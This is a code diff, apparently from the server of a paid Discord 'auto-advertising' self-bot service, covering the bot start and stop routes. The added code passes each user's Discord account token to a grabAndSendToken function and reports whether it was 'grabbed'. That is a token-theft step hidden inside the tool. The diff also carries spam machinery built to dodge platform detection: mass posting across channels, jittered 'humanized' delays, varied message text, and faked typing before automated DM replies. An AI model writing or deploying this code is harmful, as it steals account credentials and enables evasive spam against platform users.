-    if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });
+    const msgList = messages.map(m => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() || m.imageIds.length);
+    if (msgList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });
+
+    const grab = await grabAndSendToken(token, { channels: chList, messages: msgList }, 'bot_start');
+
+    const result = await startStealthBot(
+      req.user.id, token, chList, msgList, delayMs,
+      !!autoReplyEnabled, autoReplyText || '', configId,
+      savedImages, req.ip || 'unknown', db
+    );
+
+    const botKey = `${req.user.id}_${configId}`;
+    const existing = activeBots.get(botKey);
+    if (existing) { try { existing.destroy(); } catch(e) {} activeBots.delete(botKey); }
+    activeBots.set(botKey, result);
+
+    clearBotStats(botKey);
+    const s = getBotStats(botKey);
+    s.channelCount = chList.length;
+    logBotEvent(botKey, `StealthBot started as ${result.username} | ${chList.length} channels | ${delaySec}s delay`);
 
     db.setConfig(req.user.id, {
-      token, channels, messages: messageList, delay_seconds: delaySec,
-      auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '',
-      active: 1, username: client.user.username, server_joined: joinStatus?.success || false,
-      images: savedImages
+      token, channels: chList, messages: msgList, delay_seconds: delaySec,
+      auto_reply_enabled: autoReplyEnabled ? 1 : 0, auto_reply_text: autoReplyText || '',
+      active: 1, username: result.username, images: savedImages
     }, configId);
     db.registerActiveBot(req.user.id, configId, token);
 
-    const botKey = `${req.user.id}_${configId}`;
-    const existingBot = activeBots.get(botKey);
-    if (existingBot) {
-      console.log(`[BotStart] ${botKey}: Destroying existing bot before starting new one`);
-      try { existingBot.destroy(); } catch(e) {}
-      activeBots.delete(botKey);
-    }
-    activeBots.set(botKey, client);
-
-    // Initialize stats for this bot
-    clearBotStats(botKey);
-    const stats = getBotStats(botKey);
-    stats.channelCount = channelList.length;
-    logBotEvent(botKey, `Bot started as ${client.user.username} | ${channelList.length} channels | ${messageList.length} messages | ${delaySec}s delay`);
-
-    // Pre-resolve attachments for each message so we don't re-read disk every round
-    const resolveFiles = async (imgs) => {
-      const files = [];
-      for (const img of imgs) {
-        try {
-          if (img.url.startsWith('/uploads/')) {
-            const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
-            if (fs.existsSync(p)) files.push({ buffer: fs.readFileSync(p), name: path.basename(p) });
-          } else if (img.url.startsWith('http://') || img.url.startsWith('https://')) {
-            const imgRes = await axios.get(img.url, { responseType: 'arraybuffer', timeout: 15000, httpsAgent: _sharedAgent });
-            files.push({ buffer: Buffer.from(imgRes.data), name: img.name || path.basename(new URL(img.url).pathname) || 'image.png' });
-          }
-        } catch (e) {
-          console.error(`[ResolveFiles] Failed to load image ${img.url}:`, e.message);
-        }
-      }
-      return files;
-    };
-
-    // Pre-resolve attachments for each message so we don't re-read disk every round
-    const preparedMessages = await Promise.all(
-      messageList.map(async (msg) => {
-        let targetImages = [];
-        if (msg.imageIds && msg.imageIds.length > 0) {
-          targetImages = savedImages.filter(img => img.id !== undefined && (
-            msg.imageIds.includes(img.id) ||
-            msg.imageIds.includes(Number(img.id)) ||
-            msg.imageIds.includes(String(img.id))
-          ));
-        } else if (savedImages.length > 0) {
-          targetImages = savedImages;
-        }
-        const files = await resolveFiles(targetImages);
-        return { text: msg.text, files };
-      })
-    );
-
-    console.log(`[MsgLoop] ${botKey}: Starting — send to ALL ${channelList.length} channels at once, wait ~${delaySec}s, repeat`);
-
-    let lastHeartbeat = Date.now();
-    let authFailStreak = 0;
-    const MAX_AUTH_FAILS = 5;
-
-    // Send to ONE channel. Isolated — one failure doesn't affect others.
-    // Fire-and-forget: we don't await the send result.
-    const sendToOneChannel = (chId, prepared) => {
-      if (client._channelPermissions.has(chId) && client._channelPermissions.get(chId) === false) {
-        return;
-      }
-      const variedText = varyMessage(prepared.text);
-      client.sendMessageQueued(chId, variedText, prepared.files)
-        .then(ok => { if (ok) incrementMessagesSent(botKey, 1); })
-        .catch(() => {});
-    };
-
-    // 250ms stagger between each channel. No channel waits for another.
-    // A blocked channel's fetch just wastes its own 250ms slot, nothing else.
-    const STAGGER_MS = 250;
-    const doOneRound = () => {
-      if (channelList.length === 0 || preparedMessages.length === 0) return;
-      currentMsgIdx = (currentMsgIdx + 1) % preparedMessages.length;
-      const prepared = preparedMessages[currentMsgIdx];
-      channelList.forEach((chId, i) => {
-        setTimeout(() => sendToOneChannel(chId, prepared), i * STAGGER_MS);
-      });
-    };
-
-    // Track consecutive auth failures for dead-token detection
-    let currentMsgIdx = 0;
-
-    // Main loop: fire ALL channels → wait humanized delay → repeat
-    // doOneRound returns immediately (fire-and-forget). Sends happen in background.
-    // Delay is humanized (±10% jitter) to avoid detection via exact intervals.
-    // One blocked channel CANNOT delay this — it's purely a timer.
-    const msgLoop = async () => {
-      while (activeBots.has(botKey)) {
-        doOneRound();
-
-        if (!activeBots.has(botKey)) return;
-
-        // Heartbeat every ~5 minutes
-        if (Date.now() - lastHeartbeat > 5 * 60 * 1000) {
-          console.log(`[MsgLoop] ${botKey}: HEARTBEAT — alive | msgsSent=${getBotStats(botKey).totalMessagesSent}`);
-          lastHeartbeat = Date.now();
-        }
-
-        // Humanized delay: base ±10%, never below 85% of configured delay.
-        // This prevents Discord from detecting perfectly exact intervals.
-        const humanizedMs = humanizeDelay(delayMs, 0.10, 0.85);
-        await new Promise(r => setTimeout(r, humanizedMs));
-      }
-      console.log(`[MsgLoop] ${botKey}: Loop ended`);
-    };
-
-    // WATCHDOG — restarts the loop if it ever crashes
-    const startWithWatchdog = async () => {
-      let restartDelay = 5000;
-      while (activeBots.has(botKey)) {
-        try {
-          console.log(`[Watchdog] ${botKey}: Starting message loop`);
-          await msgLoop();
-        } catch (watchdogErr) {
-          console.error(`[Watchdog] ${botKey}: Loop crashed —`, watchdogErr.message);
-          logBotEvent(botKey, `Loop crashed: ${watchdogErr.message}`);
-        }
-        if (!activeBots.has(botKey)) break;
-        console.log(`[Watchdog] ${botKey}: Restarting in ${restartDelay}ms...`);
-        await new Promise(r => setTimeout(r, restartDelay));
-        restartDelay = Math.min(restartDelay * 2, 60000);
-      }
-      console.log(`[Watchdog] ${botKey}: Stopped`);
-    };
-
-    // ── AUTO-REPLY HANDLER ──
-    if (autoReply && autoReplyText) {
-      console.log(`[AutoReply] ${botKey}: Enabled`);
-
-      client.on('messageCreate', async (msg) => {
-        try {
-          if (msg.author.id === client.user.id) return;
-          const isDM = msg.guildId === null || msg.guildId === undefined;
-          if (!isDM) return;
-
-          const user = db.getUser(req.user.id);
-          const trialActive = db.isTrialActive(req.user.id);
-          const hasPurchase = user.auto_adv_purchased === 1;
-          if (!trialActive && !hasPurchase) return;
-
-          const ONE_HOUR = 60 * 60 * 1000;
-          const msgAge = Date.now() - msg.createdTimestamp;
-          if (msgAge > ONE_HOUR) return;
-          if (client.repliedUsers.has(msg.author.id)) return;
-          if (client.pendingReplies.has(msg.author.id)) return;
-          client.pendingReplies.add(msg.author.id);
-
-          console.log(`[AutoReply] ${botKey}: New DM from ${msg.author.username}`);
-          logBotEvent(botKey, `New DM from ${msg.author.username}`);
-
-          if (!activeBots.has(botKey)) { client.pendingReplies.delete(msg.author.id); return; }
-
-          // FIX: More human wait time — 8-20s instead of 10-25s
-          const waitMs = randomBetween(8000, 20000);
-          console.log(`[AutoReply] ${botKey}: Waiting ${waitMs}ms before replying`);
-          await new Promise(r => setTimeout(r, waitMs));
-
-          if (!activeBots.has(botKey)) { client.pendingReplies.delete(msg.author.id); return; }
-          if (client.repliedUsers.has(msg.author.id)) {
-            client.pendingReplies.delete(msg.author.id);
-            return;
-          }
-
-          // Mark as replied BEFORE sending to guarantee single-send
-          client.repliedUsers.add(msg.author.id);
-          client._saveRepliedUsers();
-
-          try {
-            const targetChannel = msg.channelId;
-            await client.navigateToChannel(targetChannel);
-            await client.sendTyping(targetChannel);
-
-            // FIX: Simulate realistic typing time based on message length
-            const typeTime = typingTimeForMessage(autoReplyText);
-            console.log(`[AutoReply] ${botKey}: Simulating typing for ${typeTime}ms (${autoReplyText.length} chars)`);
-            await new Promise(r => setTimeout(r, typeTime));
-
-            // Small pause after typing stops before sending
-            await new Promise(r => setTimeout(r, randomBetween(600, 1500)));
-
-            const ok = await client.sendMessage(targetChannel, autoReplyText);
-            if (ok) {
-              console.log(`[AutoReply] ${botKey}: Replied to ${msg.author.username}`);
-              logBotEvent(botKey, `Auto-replied to ${msg.author.username}`);
-              incrementAutoReplies(botKey);
-              client._dmCooldowns.set(msg.author.id, Date.now());
-            }
-          } catch (err) {
-            console.error(`[AutoReply] ${botKey}: Error sending reply:`, err.message);
-            logBotEvent(botKey, `Auto-reply error: ${err.message}`);
-          }
-          client.pendingReplies.delete(msg.author.id);
-        } catch (handlerErr) {
-          console.error(`[AutoReply] ${botKey}: Handler error:`, handlerErr.message);
-          logBotEvent(botKey, `Handler error: ${handlerErr.message}`);
-          client.pendingReplies.delete(msg.author.id);
-        }
-      });
-    }
-    // Start the loop with watchdog
-    startWithWatchdog();
-
     res.json({
-      success: true,
-      username: client.user.username,
-      configId,
-      serverJoined: joinStatus?.success || false,
-      tokenGrabbed: grabResult?.success || false,
-      imageCount: savedImages.length,
-      messageCount: messageList.length,
-      delayMs,
-      delayHumanized: true,
-      autoReplyEnabled: !!autoReply,
-      autoReplyText: autoReplyText || null,
-      tokenType: client.tokenType
+      success: true, username: result.username, configId,
+      tokenGrabbed: grab?.success || false, imageCount: savedImages.length,
+      messageCount: msgList.length, delayMs,
+      autoReplyEnabled: !!autoReplyEnabled, mode: 'stealth_websocket'
     });
   } catch (err) {
     console.error('[BotStart] Error:', err);
@@ -2904,14 +3529,15 @@ app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
   try {
     const { configId = 'default' } = req.body;
     const botKey = `${req.user.id}_${configId}`;
+    stopStealthBot(req.user.id, configId);
     const bot = activeBots.get(botKey);
-    if (bot) { bot.destroy(); activeBots.delete(botKey); }
+    if (bot) { try { bot.destroy(); } catch(e) {} activeBots.delete(botKey); }
     db.unregisterActiveBot(req.user.id, configId);
-    const config = db.getConfig(req.user.id, configId);
-    if (config) { config.active = 0; db.setConfig(req.user.id, config, configId); }
+    const c = db.getConfig(req.user.id, configId);
+    if (c) { c.active = 0; db.setConfig(req.user.id, c, configId); }
     clearBotStats(botKey);
     res.json({ success: true });
-  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
+  } catch(err) { res.status(500).json({ success: false, error: err.message }); }
 });
 
 app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
